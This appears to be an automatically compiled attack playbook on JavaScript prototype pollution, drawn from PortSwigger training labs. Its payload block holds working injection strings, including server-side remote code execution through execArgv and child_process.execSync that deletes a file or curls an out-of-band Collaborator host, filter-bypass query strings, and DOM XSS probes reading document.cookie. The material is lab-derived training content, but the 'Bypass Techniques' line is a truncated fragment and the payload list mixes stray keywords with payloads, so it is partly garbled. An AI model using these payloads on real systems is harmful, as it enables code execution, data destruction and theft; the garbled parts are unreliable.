## PROTOTYPE POLLUTION Playbook
*Synthesized from 10 PortSwigger labs*

### Overview
This playbook covers 10 known attack techniques for prototype_pollution.

### Attack Techniques

**DOM-based:**
- DOM XSS via an alternative prototype pollution vector
- DOM XSS via client-side prototype pollution

**General:**
- Client-side prototype pollution via browser APIs
- Client-side prototype pollution in third-party libraries
- Client-side prototype pollution via flawed sanitization
- Bypassing flawed input filters for server-side prototype pollution
- Detecting server-side prototype pollution without polluted property reflection
- Exfiltrating sensitive data via server-side prototype pollution
- Privilege escalation via server-side prototype pollution
- Remote code execution via server-side prototype pollution

### Key Payloads
```
isAdmin
/home/[TARGET_USER]/morale.txt
"__proto__": {
    "foo":"bar"
}
config
"__proto__": {
    "execArgv":[
        "--eval=require('child_process').execSync('rm /home/[TARGET_USER]/morale.txt')"
    ]
}
"__proto__": {
    "json spaces":10
}
manager.sequence
statusCode
"__proto__": {
    "shell":"vim",
    "input":":! curl https://YOUR-COLLABORATOR-ID.oastify.com\n"
}
"__proto__": {
    "execArgv":[
        "--eval=require('child_process').execSync('curl https://YOUR-COLLABORATOR-ID.oastify.com')"
    ]
}
/?__pro__proto__to__[foo]=bar
/?__pro__proto__to__.foo=bar
/?constconstructorructor[protoprototypetype][foo]=bar
/?constconstructorructor.protoprototypetype.foo=bar
POST /my-account/change-address
__proto__
/?__proto__.sequence=alert(1)
eval()
alert()
Object.defineProperty()
alert(document.cookie)
--eval
deparamSanitized.js
```

### Bypass Techniques
- 9. In the console, enter Object.prototype again. Notice that it now has its own foo property with the value bar . You've successfully found a prototyp

### Indicators of Success
- Unexpected data in response
- Error messages revealing internal info
- Behavior change confirming injection
- Out-of-band callback received
- Access to unauthorized resources

### Testing Methodology
1. **Identify injection points** — forms, parameters, headers, cookies
2. **Test basic payloads** — start simple, escalate complexity
3. **Observe responses** — errors, timing, content changes
4. **Try bypasses** — encoding, alternative syntax, filter evasion
5. **Confirm impact** — data extraction, privilege escalation, RCE

